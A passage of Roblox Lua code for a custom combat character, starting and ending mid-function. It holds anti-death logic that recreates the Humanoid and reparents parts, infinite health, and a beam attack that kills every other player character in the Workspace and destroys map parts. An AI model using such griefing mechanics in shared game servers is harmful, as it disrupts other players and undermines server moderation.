								local PARENT = STUFF[2]
								local MATERIAL = STUFF[3]
								local COLOR = STUFF[4]
								local TRANSPARENCY = STUFF[5]
								if PART:IsA("BasePart") and PART ~= RootPart then
									PART.Material = MATERIAL
									PART.Color = COLOR
									PART.Transparency = TRANSPARENCY
								end
								if PART.Parent ~= PARENT then
									Humanoid:remove()
									PART.Parent = PARENT
								end
							end
						end
					end

					local BODY3 = {}
					for e = 1, #BODY3 do
						if BODY3[e] ~= nil then
							local STUFF = BODY3[e]
							local PART = STUFF[1]
							local PARENT = STUFF[2]
							local MATERIAL = STUFF[3]
							local COLOR = STUFF[4]
							local TRANSPARENCY = STUFF[5]
							if PART.ClassName == "Part" and PART ~= RootPart then
								PART.Material = MATERIAL
								PART.Color = COLOR
								PART.Transparency = TRANSPARENCY
							end
							PART.AncestryChanged:Connect(function()
								PART.Parent = PARENT
							end)
						end
					end
					function Refit4()
						if Character.Parent ~= game:GetService("Workspace") then
							Character.Parent = game:GetService("Workspace")
						end
						for e = 1, #BODY3 do
							if BODY3[e] ~= nil then
								local STUFF = BODY3[e]
								local PART = STUFF[1]
								local PARENT = STUFF[2]
								local MATERIAL = STUFF[3]
								local COLOR = STUFF[4]
								local TRANSPARENCY = STUFF[5]
								if PART:IsA("BasePart") and PART ~= RootPart then
									PART.Material = MATERIAL
									PART.Color = COLOR
									PART.Transparency = TRANSPARENCY
								end
								if PART.Parent ~= PARENT then
									Humanoid:remove()
									Humanoid = IT("Humanoid",Character)
								end
							end
						end
					end

					local BODY4 = {}
					for e = 1, #BODY4 do
						if BODY4[e] ~= nil then
							local STUFF = BODY4[e]
							local PART = STUFF[1]
							local PARENT = STUFF[2]
							local MATERIAL = STUFF[3]
							local COLOR = STUFF[4]
							local TRANSPARENCY = STUFF[5]
							if PART.ClassName == "Part" and PART ~= RootPart then
								PART.Transparency = TRANSPARENCY
							end
							PART.AncestryChanged:Connect(function()
								PART.Parent = PARENT
							end)
						end
					end
					function Refit5()
						Character.Parent = game:GetService("Workspace")
						for e = 1, #BODY4 do
							if BODY4[e] ~= nil then
								local STUFF = BODY4[e]
								local PART = STUFF[1]
								local PARENT = STUFF[2]
								local MATERIAL = STUFF[3]
								local COLOR = STUFF[4]
								local TRANSPARENCY = STUFF[5]
								if PART:IsA("BasePart") and PART ~= RootPart then
									PART.Transparency = TRANSPARENCY
								end
								if PART.Parent ~= PARENT then
									Humanoid:remove()
									PART.Parent = PARENT
									Humanoid = IT("Humanoid",Character)

								end
							end
						end
					end

					local BODY5 = {}
					local EXTRATRANS = 0

					function Refit6()
						Character.Parent = game:GetService("Workspace")
						for e = 1, #BODY5 do
							if BODY5[e] ~= nil then
								local STUFF = BODY5[e]
								local PART = STUFF[1]
								local PARENT = STUFF[2]
								local MATERIAL = STUFF[3]
								local COLOR = STUFF[4]
								local TRANSPARENCY = STUFF[5]
								if PART:IsA("BasePart") and PART ~= RootPart then
									PART.Transparency = TRANSPARENCY+EXTRATRANS
								end
								if PART.Parent ~= PARENT then
									Humanoid:remove()
									PART.Parent = PARENT
									Humanoid = IT("Humanoid",Character)
								end
							end
						end
					end

					local BODY6 = {}

					function Refit7()
						Character.Parent = game:GetService("Workspace")
						Effects.Parent = Character
						for e = 1, #BODY6 do
							if BODY6[e] ~= nil then
								local STUFF = BODY6[e]
								local PART = STUFF[1]
								local PARENT = STUFF[2]
								local MATERIAL = STUFF[3]
								local COLOR = STUFF[4]
								local TRANSPARENCY = STUFF[5]
								local NAME = STUFF[7]
								if PART.ClassName == "Part" and PART ~= RootPart then
									PART.Material = MATERIAL
									PART.Transparency = TRANSPARENCY
									PART.Name = NAME
								end
								if PART.Parent ~= PARENT then
									if PART.Name == "Head" or PART.Name == "Neck" or PART.Name == "Torso" then
										Humanoid:remove()
									end
									PART.Parent = PARENT
									if PART.Name == "Head" or PART.Name == "Neck" or PART.Name == "Torso" then
										Humanoid = IT("Humanoid", Character)
									end
								end
							end
						end
					end
					local BODY7 = {}

					for e = 1, #BODY7 do
						if BODY7[e] ~= nil then
							local STUFF = BODY7[e]
							local PART = STUFF[1]
							local PARENT = STUFF[2]
							local MATERIAL = STUFF[3]
							local COLOR = STUFF[4]
							local TRANSPARENCY = STUFF[5]
							--local SIZE = STUFF[6]
							local NAME = STUFF[7]
							if PART.ClassName == "Part" and PART ~= RootPart then
								PART.Material = MATERIAL
								PART.Color = COLOR
								PART.Transparency = TRANSPARENCY
							end
							PART.AncestryChanged:Connect(function()
								PART.Parent = PARENT
							end)
						end
					end

					function Refit8()
						Character.Parent = game:GetService("Workspace")
						for e = 1, #BODY7 do
							if BODY7[e] ~= nil then
								local STUFF = BODY7[e]
								local PART = STUFF[1]
								local PARENT = STUFF[2]
								local MATERIAL = STUFF[3]
								local COLOR = STUFF[4]
								local TRANSPARENCY = STUFF[5]
								--local SIZE = STUFF[6]
								local NAME = STUFF[7]
								if PART.ClassName == "Part" and PART ~= RootPart then
									PART.Material = MATERIAL
									PART.Transparency = TRANSPARENCY
									PART.Name = NAME
								end
								if PART.Parent ~= PARENT then
									Humanoid:remove()
									PART.Parent = PARENT
									Humanoid = IT("Humanoid",Character)
								end
							end
						end
					end
					local BODY8 = {}

					for e = 1, #BODY8 do
						if BODY8[e] ~= nil then
							local STUFF = BODY8[e]
							local PART = STUFF[1]
							local PARENT = STUFF[2]
							local MATERIAL = STUFF[3]
							local COLOR = STUFF[4]
							local TRANSPARENCY = STUFF[5]
							if PART.ClassName == "Part" and PART ~= RootPart then
								PART.Material = MATERIAL
								PART.Color = COLOR
								PART.Transparency = TRANSPARENCY
							end
							PART.AncestryChanged:Connect(function()
								PART.Parent = PARENT
							end)
						end
					end

					function Refit9()
						Character.Parent = game:GetService("Workspace")
						for e = 1, #BODY8 do
							if BODY8[e] ~= nil then
								local STUFF = BODY8[e]
								local PART = STUFF[1]
								local PARENT = STUFF[2]
								local MATERIAL = STUFF[3]
								local COLOR = STUFF[4]
								local TRANSPARENCY = STUFF[5]
								if PART.ClassName == "Part" and PART ~= RootPart then
									PART.Material = MATERIAL
									PART.Color = COLOR
									PART.Transparency = TRANSPARENCY
								end
								if PART.Parent ~= PARENT then
									Humanoid:remove()
									PART.Parent = PARENT
									Humanoid = IT("Humanoid",Character)
								end
							end
						end
					end
					local EXTRATRANS = 0
					local BODY9 = {}
					for e = 1, #BODY9 do
						if BODY9[e] ~= nil then
							local STUFF = BODY9[e]
							local PART = STUFF[1]
							local PARENT = STUFF[2]
							local MATERIAL = STUFF[3]
							local COLOR = STUFF[4]
							local TRANSPARENCY = STUFF[5]
							if PART.ClassName == "Part" and PART ~= RootPart then
								PART.Material = MATERIAL
								PART.Color = COLOR
								PART.Transparency = TRANSPARENCY
							end
							PART.AncestryChanged:Connect(function()
								PART.Parent = PARENT
							end)
						end
					end

					function Refit10()
						Character.Parent = game:GetService("Workspace")
						for e = 1, #BODY9 do
							if BODY9[e] ~= nil then
								local STUFF = BODY9[e]
								local PART = STUFF[1]
								local PARENT = STUFF[2]
								local MATERIAL = STUFF[3]
								local COLOR = STUFF[4]
								local TRANSPARENCY = STUFF[5]
								if PART:IsA("BasePart") and PART ~= RootPart then
									PART.Material = MATERIAL
									PART.Color = COLOR
									PART.Transparency = TRANSPARENCY+EXTRATRANS
								end
								if PART.Parent ~= PARENT then
									Humanoid:remove()
									PART.Parent = PARENT
									Humanoid = IT("Humanoid",Character)
								end
							end
						end
					end

					local BODY10 = {}
					function Refit11()
						Character.Parent = game:GetService("Workspace")
						for e = 1, #BODY10 do	
							if BODY10[e] ~= nil then
								local STUFF = BODY10[e]
								local MATERIAL = STUFF[3]
								local COLOR = STUFF[4]
								local PART = STUFF[1]
								local PARENT = STUFF[2]
								local TRANSPARENCY = STUFF[5]
								if PART.ClassName == "Part" and PART ~= RootPart then
									PART.Material = MATERIAL
									PART.Color = COLOR
									PART.Transparency = TRANSPARENCY
								end
								if PART.Parent ~= PARENT then
									Humanoid:remove()
									PART.Parent = PARENT
									Humanoid = IT("Humanoid",Character)
								end
							end
						end
					end

					local BODY11 = {}

					function Refit12()
						Character.Parent = game:GetService("Workspace")
						Effects.Parent = Character
						for e = 1, #BODY11 do
							if BODY11[e] ~= nil then
								local STUFF = BODY11[e]
								local PART = STUFF[1]
								local PARENT = Character:FindFirstChild("Safety") or STUFF[2]
								local MATERIAL = STUFF[3]
								local COLOR = STUFF[4]
								local TRANSPARENCY = STUFF[5]
								local NAME = STUFF[7]
								if PART.ClassName == "Part" and PART ~= RootPart then
									PART.Material = MATERIAL
									PART.Transparency = TRANSPARENCY
									PART.Name = NAME
								end
								if PART.Parent ~= PARENT then
									if PART.Name == "Head" or PART.Name == "Neck" or PART.Name == "Torso" then
										Humanoid:remove()
									end
									PART.Parent = PARENT
									if PART.Name == "Head" or PART.Name == "Neck" or PART.Name == "Torso" then
									end
								end
							end
						end
					end

					local BODY12 = {}
					function Refit13()
						Character.Parent = game:GetService("Workspace")
						for e = 1, #BODY12 do
							if BODY12[e] ~= nil then
								local STUFF = BODY12[e]
								local PART = STUFF[1]
								local PARENT = STUFF[2]
								local MATERIAL = STUFF[3]
								local COLOR = STUFF[4]
								local TRANSPARENCY = STUFF[5]
								local SIZE = STUFF[6]
								local NAME = STUFF[7]
								if PART.ClassName == "Part" and PART ~= RootPart then
									PART.Material = MATERIAL
									PART.Transparency = TRANSPARENCY
									PART.Name = NAME
								end
								if PART.Parent ~= PARENT then
									Humanoid:remove()
									PART.Parent = PARENT
									Humanoid = IT("Humanoid",Character)
								end
								Humanoid.MaxHealth = "inf"
								Humanoid.Health = "Inf"
							end
						end
					end


					Humanoid.Died:Connect(Refit)
					Humanoid.Died:connect(Refit2)
					Humanoid.Died:connect(Refit3)
					Humanoid.Died:connect(Refit4)
					Humanoid.Died:connect(Refit5)
					Humanoid.Died:connect(Refit6)
					Humanoid.Died:connect(Refit7)
					Humanoid.Died:connect(Refit8)
					Humanoid.Died:connect(Refit9)
					Humanoid.Died:connect(Refit10)
					Humanoid.Died:connect(Refit11)
					Humanoid.Died:connect(Refit12)
					Humanoid.Died:connect(Refit13)
					Humanoid.HealthChanged:Connect(function()
						if Humanoid.Health <= 1 then
							Humanoid.Health = math.huge
							Refit()
							Refit2()
							Refit3()
							Refit4()
							Refit5()
							Refit6()
							Refit7()
							Refit8()
							Refit9()
							Refit10()
							Refit11()
							Refit12()
							Refit13()
						end
					end)

					for _, c in pairs(Character:GetChildren()) do
						if c and c.Parent then
							if c.ClassName == "Accessory" then
								local ACCESSORY = c
								local HANDLE = c.Handle
								HANDLE.Parent = Character
								if c then
									if HANDLE:FindFirstChild("HatAttachment") or HANDLE:FindFirstChild("FaceFrontAttachment") or HANDLE:FindFirstChild("HairAttachment") then
										local WLD = weldBetween(Head,HANDLE)
									else
										local WLD = weldBetween(Torso,HANDLE)
									end
								end
								HANDLE.Name = ACCESSORY.Name
								ACCESSORY:remove()
							end
						end
					end
					local BODY = {}
					for _, c in pairs(Character:GetDescendants()) do
						if c:IsA("BasePart") and c.Name ~= "Handle" and not c:IsDescendantOf(Effects) then
							if c ~= RootPart and c ~= Torso and c ~= Head and c ~= RightArm and c ~= LeftArm and c ~= RightLeg and c ~= LeftLeg then
								c.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
							end
							table.insert(BODY,{c,c.Parent,c.Material,c.Color,c.Transparency,c.Size,c.Name})
						elseif c:IsA("JointInstance") then
							table.insert(BODY,{c,c.Parent,nil,nil,nil,nil,nil})
						end
					end
					for e = 1, #BODY do
						if BODY[e] ~= nil then
							do
								local STUFF = BODY[e]
								local PART = STUFF[1]
								local PARENT = STUFF[2]
								local MATERIAL = STUFF[3]
								local COLOR = STUFF[4]
								local TRANSPARENCY = STUFF[5]
								if PART.ClassName == "Part" and PART ~= RootPart then
									PART.Material = MATERIAL
									PART.Transparency = TRANSPARENCY
								end
								PART.AncestryChanged:Connect(function()
									PART.Parent = PARENT
								end)
							end
						end
					end
					function refit()
						coroutine.resume(coroutine.create(function()
							wait()
							Humanoid.Died:connect(refit)
						end))
						Character.Parent = game:GetService("Workspace")
						Effects.Parent = Character
						for e = 1, #BODY do
							if BODY[e] ~= nil then
								local STUFF = BODY[e]
								local PART = STUFF[1]
								local PARENT = STUFF[2]
								local MATERIAL = STUFF[3]
								local COLOR = STUFF[4]
								local TRANSPARENCY = STUFF[5]
								local SIZE = STUFF[6]
								local NAME = STUFF[7]
								if PART.ClassName == "Part" and PART:IsA("BasePart") and PART ~= RootPart then
									PART.Material = MATERIAL
									PART.Transparency = TRANSPARENCY
									PART.Name = NAME
								end
								if PART.Parent ~= PARENT then
									if PART.Name == "Head" or PART.Name == "Neck" or PART.Name == "Torso" then
										Humanoid:remove()
									end
									PART.Parent = PARENT
									if PART.Name == "Head" or PART.Name == "Neck" or PART.Name == "Torso" then
										Humanoid = Instance.new("Humanoid",Character)
									end
								end
							end
						end
					end
					local Regen = {}
					for e = 1, #Regen do
						if Regen[e] ~= nil then
							local STUFF = Regen[e]
							local PART = STUFF[1]
							local PARENT = STUFF[2]
							local MATERIAL = STUFF[3]
							local COLOR = STUFF[4]
							local TRANSPARENCY = STUFF[5]
							if PART.ClassName == "Part" and PART ~= BODY.RootPart then
								PART.Material = MATERIAL
								PART.Color = COLOR
								PART.Transparency = TRANSPARENCY
							end
							PART.AncestryChanged:Connect(function()
								PART.Parent = PARENT
							end)
						end
					end
					function Refit()
						coroutine.resume(coroutine.create(function()
							wait()
							Humanoid.Died:connect(Refit)	
						end))
						for i = 1,#Regen do
							local E = Regen[i]
							local PART = E[1]
							local PARENT = E[2]
							local COLOR = E[3]
							local SIZE = E[4]
							local MATERIAL = E[5]
							if PART:IsA("BasePart") and PART.Parent ~= PARENT then
								PART.Color = COLOR
								PART.Size = SIZE
								PART.Material = MATERIAL
							end
							if PART.Parent ~= PARENT then
								Humanoid.Parent = nil
								PART.Parent = PARENT
								Humanoid.Parent = Character
							end
						end
						Humanoid.Parent = Character
					end
					function Parents()
						RootJoint.Parent = RootPart
						Neck.Parent = Torso
						RightShoulder.Parent = Torso
						LeftShoulder.Parent = Torso
						RightHip.Parent = Torso
						LeftHip.Parent = Torso
						RootPart.Parent = Character
						LeftArm.Parent = Character
						RightArm.Parent = Character
						RightLeg.Parent = Character
						LeftLeg.Parent = Character
						Torso.Parent = Character
						Head.Parent = Character
						Effects.Parent = Character
					end
					local States = {
						"FallingDown";
						"PlatformStanding";
						"Physics";
						"Swimming";
						"Dead";
						"Ragdoll";
						"Seated";
					}
					for i,v in pairs(States) do
						Humanoid:SetStateEnabled(v,false)
					end

					--//=================================\\
					--||	ATTACK FUNCTIONS AND STUFF
					--\\=================================//

					function BladeCombo()
						ATTACK = true
						Rooted = false
						local savespeed = Speed
						Speed = 5
						EQUIPPED = true
						local HIT2 = function()
							local HITS2 = {}
							local TOUCH2 = LeftArm.Touched:Connect(function(hit)
								if hit.Parent:FindFirstChildOfClass("Humanoid") and hit.Parent ~= Character then
									local HUM = hit.Parent:FindFirstChildOfClass("Humanoid")
									local TORSO = hit.Parent:FindFirstChild("Torso") or hit.Parent:FindFirstChild("UpperTorso")
									if TORSO and HUM.Health > 0 then
										local PASS = true
										for i = 1, #HITS2 do
											if HITS2[i] == hit.Parent then
												PASS = false
											end
										end
										table.insert(HITS2,hit.Parent)
										if PASS == true then
											Kill(HUM.Parent)
										end
									end
								end
							end)
							return TOUCH2
						end
						local HIT = function()
							local HITS = {}
							local TOUCH = Blade.REDB.Touched:Connect(function(hit)
								if hit.Parent:FindFirstChildOfClass("Humanoid") and hit.Parent ~= Character then
									local HUM = hit.Parent:FindFirstChildOfClass("Humanoid")
									local TORSO = hit.Parent:FindFirstChild("Torso") or hit.Parent:FindFirstChild("UpperTorso")
									if TORSO and HUM.Health > 0 then
										local PASS = true
										for i = 1, #HITS do
											if HITS[i] == hit.Parent then
												PASS = false
											end
										end
										table.insert(HITS,hit.Parent)
										if PASS == true then
											Kill(HUM.Parent)
										end
									end
								end
							end)
							return TOUCH
						end
						if COMBO == 1 then
							Blade.REDB.Trail.Enabled = true
							for i=0, 0.35, 0.1 / 3 do
								Swait()
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(15), RAD(0), RAD(5)), 3 / 3)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(-15)), 1 / 3)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(90)) * RIGHTSHOULDERC0, 1 / 3)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-15)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / 3)  
								if ANIM=="Walk" then
									RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-5 + 50 * SIN(SINE / 12))), 1 / 3)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(5 + 50 * SIN(SINE / 12))), 1 / 3)
								else
									RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / 3)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / 3)
								end
							end
							CreateSound(1489705211,RightArm,MATHR(7,8),MATHR(8,13)/12,false)
							local TOUCHED = HIT()
							for i=0, 0.5, 0.1 / 3 do
								Swait()
								WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightArm.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(0,5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(15), RAD(0), RAD(-35)), 3 / 3)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(45)), 1 / 3)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(0.8, 0.5, -0.7) * ANGLES(RAD(0), RAD(0), RAD(-90)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / 3)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-15)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / 3)
								if ANIM=="Walk" then
									RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-5 + 50 * SIN(SINE / 12))), 1 / 3)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(5 + 50 * SIN(SINE / 12))), 1 / 3)
								else
									RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / 3)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / 3)
								end
							end
							TOUCHED:Disconnect()
							COMBO = 2
							Blade.REDB.Trail.Enabled = false
						elseif COMBO == 2 then
							for i=0, 0.35, 0.1 / 3 do
								Swait()
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(15), RAD(0), RAD(5)), 3 / 3)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(15)), 1 / 3)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(15)) * RIGHTSHOULDERC0, 1 / 3)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-20), RAD(0), RAD(-15)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / 3)
								if ANIM=="Walk" then
									RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-5 + 50 * SIN(SINE / 12))), 1 / 3)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(5 + 50 * SIN(SINE / 12))), 1 / 3)
								else
									RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / 3)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / 3)
								end
							end
							CreateSound(1489705211,LeftArm,MATHR(7,8),MATHR(8,13)/12,false)
							local TOUCHED = HIT2()
							for i=0, 0.5, 0.1 / 3 do
								Swait()
								WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftArm.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(0.5,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(15), RAD(0), RAD(45)), 3 / 3)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(-55)), 1 / 3)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(15)) * ANGLES(RAD(0), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 0.6 / 3)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, -0.5) * ANGLES(RAD(0), RAD(0), RAD(-105)) * ANGLES(RAD(90), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / 3)
								if ANIM=="Walk" then
									RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-5 + 50 * SIN(SINE / 12))), 1 / 3)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(5 + 50 * SIN(SINE / 12))), 1 / 3)
								else
									RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / 3)
									LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / 3)
								end
							end
							TOUCHED:Disconnect()
							COMBO = 1
						end
						coroutine.resume(coroutine.create(function()
							for i = 1, 50 do
								Swait()
								if ATTACK == true then
									break
								end
							end
							if ATTACK == false then
								COMBO = 1
							end
						end))
						Speed = savespeed
						ATTACK = false
						Rooted = false
						EQUIPPED = false
					end
					function Lightning(Part0,Part1,Timess,Offset,Color,Timer,sSize,eSize,Trans,Boomer,sBoomer,Trans2)
						local magz = (Part0 - Part1).Magnitude
						local Times = math.floor(math.clamp(magz/10,1,20))
						local curpos = Part0
						local trz = {
							-Offset,
							Offset
						}
						for i = 1,Times do
							local li = Instance.new("Part",Effects)
							li.Name = randomstring()
							li.TopSurface = 0
							li.Material = "Neon"
							li.BottomSurface = 0
							li.Anchored = true
							li.Locked = true
							li.Transparency = 0
							li.Color = Color
							li.formFactor = "Custom"
							li.CanCollide = false
							li.Size = Vector3.new(0.1,0.1,magz/Times)
							local Offzet = Vector3.new(trz[math.random(1,2)],trz[math.random(1,2)],trz[math.random(1,2)])
							local trolpos = CFrame.new(curpos,Part1) * CFrame.new(0,0,magz/Times).p + Offzet
							if Times == i then
								local magz2 = (curpos - Part1).Magnitude
								li.Size = Vector3.new(0.1,0.1,magz2)
								li.CFrame = CFrame.new(curpos,Part1) * CFrame.new(0,0,-magz2/2)
							else
								li.CFrame = CFrame.new(curpos,trolpos) * CFrame.new(0,0,magz/Times/2)
							end
							curpos = li.CFrame * CFrame.new(0,0,magz/Times/2).p
							li:Destroy()
							Effect2({Time = Timer,EffectType = "Box",Size = Vector3.new(sSize,sSize,li.Size.Z),Size2 = Vector3.new(eSize,eSize,li.Size.Z),Transparency = Trans,Transparency2 = Trans2 or 1,CFrame = li.CFrame,MoveToPos = nil,RotationX = nil,RotationY = nil,RotationZ = nil,Material = "Neon",Color = li.Color,SoundID = nil,SoundPitch = nil,SoundVolume = nil,UseBoomerangMath = Boomer,Boomerang = 0,SizeBoomerang = sBoomer})
						end
					end
					local stopeverything = true
					function AttackGyro()
						local GYRO = Instance.new("BodyGyro",RootPart)
						GYRO.D = 25
						GYRO.P = 20000
						GYRO.MaxTorque = Vector3.new(0,4000000,0)
						GYRO.CFrame = CFrame.new(RootPart.Position,Mouse.Hit.p)
						coroutine.resume(coroutine.create(function()
							repeat if stopeverything then wait(math.huge) end
								swait()
								GYRO.CFrame = CFrame.new(RootPart.Position,Mouse.Hit.p)
							until ATTACK == false
							GYRO:Destroy()
						end))
					end
					function SingularityBeam()
						ATTACK = true
						Speed = 0
						AttackGyro()
						for i = 0,0.5,0.05 do
							swait()
							RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CFrame.new(0 + .5 * math.cos(sine/50),0,3 - .5 * math.sin(sine/50)) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(-60)),0.7/3)
							Neck.C0 = Clerp(Neck.C0,nc0 * CFrame.new() * CFrame.Angles(math.rad(0),math.rad(0),math.rad(60)),1/3)
							RightShoulder.C0 = Clerp(RightShoulder.C0,CFrame.new(1.25,0.5,-.25) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(-60)) * rscp,1/3)
							LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.25,0.5,-.25) * CFrame.Angles(math.rad(95),math.rad(0),math.rad(10)) * lscp,1/3)
							RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1,-0.5,-0.5) * CFrame.Angles(math.rad(-15 + 9 * math.cos(sine/74)),math.rad(80),math.rad(0)) * CFrame.Angles(math.rad(0 + 5 * math.cos(sine/37)),math.rad(0),math.rad(0)),0.7/3)
							LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1,-1,0) * CFrame.Angles(math.rad(-15 - 9 * math.cos(sine/54)),math.rad(-80),math.rad(0)) * CFrame.Angles(math.rad(0 - 5 * math.cos(sine/41)),math.rad(0),math.rad(0)),0.7/3)
						end
						local HoleDist = (cannon.Part.Position - cannon.Part.Position).Magnitude
						local chargebeam = CreatePart(3,Effects,"Neon",0,0,COLORSHIFT,"Charge Beam",Vector3.new(.25,HoleDist,.25),false)
						MakeForm(chargebeam,"Cyl")
						chargebeam.CFrame = CFrame.new(cannon.Part.Position,cannon.Part.Position) * CFrame.new(0,0,-HoleDist/2) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(0))
						local chargeweld = weldBetween(cannon.Part,chargebeam)
						local chargeball = CreatePart(3,Effects,"Neon",0,0,COLORSHIFT,"Charge Ball",Vector3.new(.5,.5,.5),false)
						chargeball.Shape = "Ball"
						chargeball.CFrame = cannon.Part.CFrame
						weldBetween(cannon.Part,chargeball)
						CreateSound(342793847,cannon.Part,10,1,false)
						local bigball = game:GetService("TweenService"):Create(chargeball,TweenInfo.new(3.86,Enum.EasingStyle.Linear),{Size = Vector3.new(2.5,2.5,2.5)})
						bigball:Play()
						bigball.Completed:Wait()
						chargebeam:Destroy()
						local KillDist = (cannon.Part.Position - Mouse.Hit.p).Magnitude
						coroutine.resume(coroutine.create(function()
							repeat if stopeverything then wait(math.huge) end KillDist = (cannon.Part.Position - Mouse.Hit.p).Magnitude Swait() until ATTACK == false
						end))
						game:GetService("Lighting").ExposureCompensation = 100
						for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
							if v:IsA("Model") and v:FindFirstChildOfClass("Humanoid") and v ~= Character then
								Kill(v)
							elseif v:IsA("MeshPart") or v:IsA("UnionOperation") and v ~= cannon then
								if v ~= cannon then
									v.Locked = false
									MeshPartKill(v)
								end
							end
						end
						CreateSound(138677306,cannon.Part,10,1,false)
						CreateSound(415700134,cannon.Part,10,1,false)
						Swait(150)
						CreateSound(3264923,cannon.Part,10,1,false)
						Swait(30)
						chargeball:Destroy()
						Speed = 30
						ATTACK = false
						game:GetService("Lighting").ExposureCompensation = 0
					end
					function Ka_Boom()
						ATTACK = true
